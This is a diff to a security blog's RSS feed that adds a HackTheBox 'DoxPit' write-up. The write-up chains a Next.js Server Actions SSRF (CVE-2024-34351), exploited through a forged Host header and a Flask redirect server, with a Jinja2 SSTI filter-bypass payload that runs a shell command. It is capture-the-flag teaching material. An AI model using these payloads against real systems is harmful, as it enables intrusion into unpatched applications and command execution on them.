@@ -1,4 +1,180 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>minhi1</title><description>blogs</description><link>https://minhi1.github.io/</link><language>en</language><item><title>HackTheBox - [Dusty Alleys challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/htb/medium/dusty-alleys/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/htb/medium/dusty-alleys/</guid><description>Writeup for the Dusty Alleys challenge (level Medium)</description><pubDate>Mon, 12 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Challenge Overview&lt;/h2&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>minhi1</title><description>blogs</description><link>https://minhi1.github.io/</link><language>en</language><item><title>HackTheBox - [DoxPit challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/htb/medium/doxpit/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/htb/medium/doxpit/</guid><description>Writeup for the DoxPit challenge (level Medium)</description><pubDate>Thu, 15 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Challenge Overview&lt;/h2&gt;
+&lt;p&gt;In this challenge, we are provided a front-end application with a backend server running at different port. The goal is to successfully access the backend endpoints and perform shell code to get the flag.&lt;/p&gt;
+&lt;h2&gt;Step 1: SSRF to access the backend&lt;/h2&gt;
+&lt;h3&gt;Analysis&lt;/h3&gt;
+&lt;p&gt;Scanning the front-end code and the only suspicious files are &lt;code&gt;serverActions.tsx&lt;/code&gt; and &lt;code&gt;pastetable.tsx&lt;/code&gt; (which imports function from &lt;code&gt;serverActions.tsx&lt;/code&gt;). The code in &lt;code&gt;serverActions.tsx&lt;/code&gt; is.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&quot;use server&quot;;
+
+import { redirect } from &quot;next/navigation&quot;;
+
+export async function doRedirect() {
+  redirect(&quot;/error&quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The &lt;code&gt;&quot;user server&quot;;&lt;/code&gt; is a directive that indicates a function/file to be executed on the &lt;strong&gt;server side&lt;/strong&gt;. (React document &lt;a href=&quot;https://react.dev/reference/rsc/use-server#reference&quot;&gt;here&lt;/a&gt;) It marks server-side functions that can be called from client-side code.&lt;/p&gt;
+&lt;p&gt;In &lt;code&gt;pastetable.tsx&lt;/code&gt; (client code), it calls the &lt;code&gt;doRedirect()&lt;/code&gt; function (server-side function).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;form action={doRedirect}&amp;gt;
+    &amp;lt;button className=&quot;link-light&quot; type=&quot;submit&quot;&amp;gt;
+    {paste.title}&amp;lt;/button&amp;gt;
+&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I have a sneaky suspicious that perhaps the exploited methods involving clicking on the click, then it will do something unsafe to the server.&lt;/p&gt;
+&lt;p&gt;Since I&apos;ve never used the &quot;use server&quot; functionality, let&apos;s do some Google Search about related vulnerabilities with the keyword.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nextjs &quot;use server&quot; redirect vulnerabilities
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;image-1.png&quot; alt=&quot;alt text&quot; /&gt;
+Link: https://deepstrike.io/blog/nextjs-security-testing-bug-bounty-guide
+The related part is &lt;strong&gt;Next.js Server Actions&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;A brief explaination of what happens when we click on the form link.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;When a Client Component or &amp;lt;form action={someServerAction}&amp;gt; triggers a Server Action, Next.js does not always call a plain public URL. Instead, the client sends a POST to an internal Next endpoint and includes a header or form field that identifies the action. That identifier appears as a header, commonly shown as Next-Action, and maps the incoming request to the specific server function to execute. In practice, the server ignores the request path and uses the Next-Action token to dispatch the call.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As the summary said, the URL and path does not matter at all. We just need to pass the correct &lt;code&gt;Next-Action&lt;/code&gt; header.&lt;/p&gt;
+&lt;p&gt;Following up, the blog also said that this is &lt;strong&gt;CVE-2024-34351&lt;/strong&gt;. To have a better vision of how to exploit, I read this &lt;a href=&quot;https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps&quot;&gt;assetnote blog&lt;/a&gt; from Assetnote security team.&lt;/p&gt;
+&lt;p&gt;An important cause for this CVE is that the code uses &lt;strong&gt;relative path&lt;/strong&gt; (&lt;code&gt;redirect(&quot;/error&quot;)&lt;/code&gt;). In NextJS source code, if a server action is called and it responses with a redirect including the relative path, the server will fetch the result based on the &lt;code&gt;Host header&lt;/code&gt; taken from the client.&lt;/p&gt;
+&lt;p&gt;Here is the NextJS source code (from the &lt;a href=&quot;https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps&quot;&gt;assetnote blog&lt;/a&gt;).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;async function createRedirectRenderResult(
+  req: IncomingMessage,
+  res: ServerResponse,
+  redirectUrl: string,
+  basePath: string,
+  staticGenerationStore: StaticGenerationStore
+) {
+  res.setHeader(&apos;x-action-redirect&apos;, redirectUrl)
+  // if we&apos;re redirecting to a relative path, we&apos;ll try to stream the response
+  if (redirectUrl.startsWith(&apos;/&apos;)) {
+    const forwardedHeaders = getForwardedHeaders(req, res)
+    forwardedHeaders.set(RSC_HEADER, &apos;1&apos;)
+
+    const host = req.headers[&apos;host&apos;]
+    const proto =
+      staticGenerationStore.incrementalCache?.requestProtocol || &apos;https&apos;
+    const fetchUrl = new URL(`${proto}://${host}${basePath}${redirectUrl}`)
+    // .. snip ..
+    try {
+      const headResponse = await fetch(fetchUrl, {
+        method: &apos;HEAD&apos;,
+        headers: forwardedHeaders,
+        next: {
+          // @ts-ignore
+          internal: 1,
+        },
+      })
+
+      if (
+        headResponse.headers.get(&apos;content-type&apos;) === RSC_CONTENT_TYPE_HEADER
+      ) {
+        const response = await fetch(fetchUrl, {
+          method: &apos;GET&apos;,
+          headers: forwardedHeaders,
+          next: {
+            // @ts-ignore
+            internal: 1,
+          },
+        })
+        // .. snip ..
+        return new FlightRenderResult(response.body!)
+      }
+    } catch (err) {
+      // .. snip ..
+    }
+  }
+
+  return RenderResult.fromStatic(&apos;{}&apos;)
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So we can inject a malicious host header. However, in the code, before fetching the URL, it sends a &lt;code&gt;HEAD&lt;/code&gt; request to the URL. Only when the &lt;code&gt;Content-Type&lt;/code&gt; header in the response is equal to &lt;code&gt;RSC_CONTENT_TYPE_HEADER&lt;/code&gt;, which is &lt;code&gt;text/x-component&lt;/code&gt;, then the &lt;code&gt;GET&lt;/code&gt; request is made to the URL.&lt;/p&gt;
+&lt;h3&gt;Exploit&lt;/h3&gt;
+&lt;p&gt;We have gathered pretty enough information for the SSRF vulnerability. Now, in the app, when clicking on a form link, it will automatically redirect to the &lt;code&gt;/error&lt;/code&gt; endpoint. But this endpoint is useless, we need to access the actual backend endpoints.&lt;/p&gt;
+&lt;p&gt;Using the strength that we can manipulate the &lt;code&gt;Host&lt;/code&gt; header, let&apos;s create a malicious server using Python with our own customized &lt;code&gt;/error&lt;/code&gt; endpoint.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from flask import Flask, Response, request, redirect, render_template_string
+app = Flask(__name__)
+
+target_url = &apos;http://127.0.0.1:3000/register?username=mi1&amp;amp;password=uia256&apos;
+
+@app.route(&apos;/error&apos;, methods=[&apos;GET&apos;, &apos;HEAD&apos;, &apos;POST&apos;])
+def catch():
+    if request.method == &apos;HEAD&apos;:
+        print(&quot;[*] === Receive a HEAD request ===&quot;)
+        resp = Response(&quot;&quot;)
+        # Set the Content-Type header
+        resp.headers[&apos;Content-Type&apos;] = &apos;text/x-component&apos;
+        return resp 
+    return redirect(target_url)
+
+@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])
+def welcome():
+   return render_template_string(&quot;&amp;lt;h1&amp;gt;Malicious Server Running&amp;lt;/h1&amp;gt;&quot;)
+
+if __name__ == &quot;__main__&quot;:
+  app.run(&quot;0.0.0.0&quot;, port=8080)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&apos;s attempt to register an account on the backend side and hope it will return the token. The malicious server can be hosted quickly using Cloudfare Tunnels (&lt;a href=&quot;https://kodelan.medium.com/hosting-your-websites-locally-with-cloudflare-tunnels-without-opening-a-port-in-your-router-9aec430c0c32&quot;&gt;instructions here&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;image-2.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We successfully registered an account with the token.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Be sure to change the Origin to match the Host header. Or we can get rid of the Origin header.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Now, the second vulnerability lie in the back-end side (&lt;code&gt;/home&lt;/code&gt; endpoint).&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Step 2: SSTI via /home endpoint&lt;/h2&gt;
+&lt;p&gt;The following code for &lt;code&gt;/home&lt;/code&gt; exposes a SSTI vulnerability with the &lt;code&gt;directory&lt;/code&gt; parameter.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;@web.route(&quot;/home&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+@auth_middleware
+def feed():
+  directory = request.args.get(&quot;directory&quot;)
+  
+  if not directory:
+    dirs = os.listdir(os.getcwd())
+    return render_template(&quot;index.html&quot;, title=&quot;home&quot;, dirs=dirs)
+
+  if any(char in directory for char in invalid_chars):
+    return render_template(&quot;error.html&quot;, title=&quot;error&quot;, error=&quot;invalid directory&quot;), 400
+
+  try:
+    with open(&quot;./application/templates/scan.html&quot;, &quot;r&quot;) as file:
+        template_content = file.read()
+        results = scan_directory(directory)
+        template_content = template_content.replace(&quot;{{ results.date }}&quot;, results[&quot;date&quot;])
+        template_content = template_content.replace(&quot;{{ results.scanned_directory }}&quot;, results[&quot;scanned_directory&quot;])
+        return render_template_string(template_content, results=results)
+        
+  except Exception as e:
+    return render_template(&quot;error.html&quot;, title=&quot;error&quot;, error=e), 500
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Since this endpoint is first passed through a middleware, so be sure to include the token parameter when sending a request.&lt;/p&gt;
+&lt;p&gt;I did a Google search for SSTI payload and found a pretty popular one on this &lt;a href=&quot;https://onsecurity.io/article/server-side-template-injection-with-jinja2/&quot;&gt;website&lt;/a&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{{request[&apos;application&apos;][&apos;__globals__&apos;][&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;)[&apos;popen&apos;](&apos;id&apos;)[&apos;read&apos;]()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;But this application has blocked some characters (&lt;code&gt;general.py&lt;/code&gt;).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import os
+from faker import Faker
+
+fake = Faker()
+
+generate = lambda x: os.urandom(x).hex()
+
+invalid_chars = [&quot;{{&quot;, &quot;}}&quot;, &quot;.&quot;, &quot;_&quot;, &quot;[&quot;, &quot;]&quot;,&quot;\\&quot;, &quot;x&quot;]
+
+def generate_user():
+    return fake.user_name()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So again, I did some research on how to bypass the filters and found 2 useful links (&lt;a href=&quot;https://mrlsecurity.com/posts/jinja2-filter-bypass/&quot;&gt;Jinja2-filter-bypass&lt;/a&gt; and &lt;a href=&quot;https://0day.work/jinja2-template-injection-filter-bypasses/&quot;&gt;Jinja2-template-injection-filter-bypass&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;The replacement is as followed.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;{{&lt;/code&gt; and &lt;code&gt;}}&lt;/code&gt; $\rightarrow$ &lt;code&gt;{%&lt;/code&gt; and &lt;code&gt;%}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.&lt;/code&gt; $\rightarrow$ &lt;code&gt;|attr(...)&lt;/code&gt;. Cannot use &lt;code&gt;object[attribute]&lt;/code&gt; because &lt;code&gt;[]&lt;/code&gt; is also blocked.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;_&lt;/code&gt; $\rightarrow$ use other request query arguments.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The above payload can be transformed into the following.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__globals__   --&amp;gt; g --&amp;gt; request|attr(&apos;args&apos;)|attr(&apos;get&apos;)(&apos;g&apos;)
+__builtins__  --&amp;gt; b --&amp;gt; request|attr(&apos;args&apos;)|attr(&apos;get&apos;)(&apos;b&apos;)
+__import__    --&amp;gt; i --&amp;gt; request|attr(&apos;args&apos;)|attr(&apos;get&apos;)(&apos;i&apos;)
+
+{% print request|attr(&apos;application&apos;)|attr(request|attr(&apos;args&apos;)|attr(&apos;get&apos;)(&apos;g&apos;))|attr(&apos;get&apos;)(request|attr(&apos;args&apos;)|attr(&apos;get&apos;)(&apos;b&apos;))|attr(&apos;get&apos;)(request|attr(&apos;args&apos;)|attr(&apos;get&apos;)(&apos;i&apos;))(&apos;os&apos;)|attr(&apos;popen&apos;)(&apos;cat /flag*&apos;)|attr(&apos;read&apos;)() %}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Simply change the &lt;code&gt;target_url&lt;/code&gt; with &lt;code&gt;http://127.0.0.1:3000/home?token={...}&amp;amp;directory={payload}&lt;/code&gt;, then send the POST request and we will get the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;image-3.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>HackTheBox - [Dusty Alleys challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/htb/medium/dusty-alleys/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/htb/medium/dusty-alleys/</guid><description>Writeup for the Dusty Alleys challenge (level Medium)</description><pubDate>Mon, 12 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Challenge Overview&lt;/h2&gt;
 &lt;p&gt;We are provided with an Nginx configuration file and a &lt;code&gt;guardian.js&lt;/code&gt; source file. The goal is to access the &lt;code&gt;/guardian&lt;/code&gt; endpoint, which is protected by a secret server name (&lt;code&gt;$SECRET_ALLEY&lt;/code&gt;), and then exploit a logic flaw to retrieve the flag.&lt;/p&gt;
 &lt;h2&gt;Step 1: Leaking the Secret Domain (Nginx Misconfiguration)&lt;/h2&gt;
 &lt;h3&gt;Analysis&lt;/h3&gt;
